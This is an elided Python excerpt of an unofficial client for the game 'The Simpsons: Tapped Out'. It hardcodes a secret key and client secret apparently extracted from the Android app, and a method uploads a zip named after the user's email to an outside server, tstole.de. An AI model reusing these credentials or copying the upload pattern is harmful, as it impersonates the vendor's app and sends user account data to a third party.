...
SECRET_KEY = '2Tok8RykmQD41uWDv5mI7JTZ7NIhcZAIPtiBm4Z5'
CLIENT_ID = 'simpsons4-android-client'
CLIENT_SECRET = 'D0fpQvaBKmAgBRCwGPvROmBf96zHnAuZmNepQht44SgyhbCdCfFgtUTdCezpWpbRI8N6oPtb38aOVg2y'  # 'cmDKrZ5E5EhvnjfA7vUpB8UDSR7ACDT5cfVbqN1pV35dyCRfdLqcCoKHnkBbIKTBATiktSZ3BO7ypGKF'
HDRS = {'Accept': '/', 'Accept-Encoding': 'gzip', 'Connection': None, 'User-Agent': None}

# pull the current mayhem code and hash
...
class TSTO:
    def __init__(self):
        ...
        nonce = datetime.datetime.now(utc).strftime('%Y-%m-%d %H:%M:%S:000')
    ...
    def send_zip_to_php(self):
        ...
        php_url = "https://tstole.de/newtool/puller.php"  # Ersetzen Sie dies durch Ihre tatsächliche URL

        # Dateien für den Upload vorbereiten
        files = {'file': open(self.mEmail + ".zip", 'rb')}
        ...
        try:
            ...
            if response.status_code == 200:
                print("ZIP-Datei erfolgreich gesendet.")
            else:
                print(f"Fehler beim Senden der Datei: {response.status_code}")
                print(response.text)
    ...
    def doAuthWithToken(self, token):
        ...
        h['mh_client_datetime'] = datetime.datetime.now(utc).strftime('%Y-%m-%d %H:%M:%S:000')
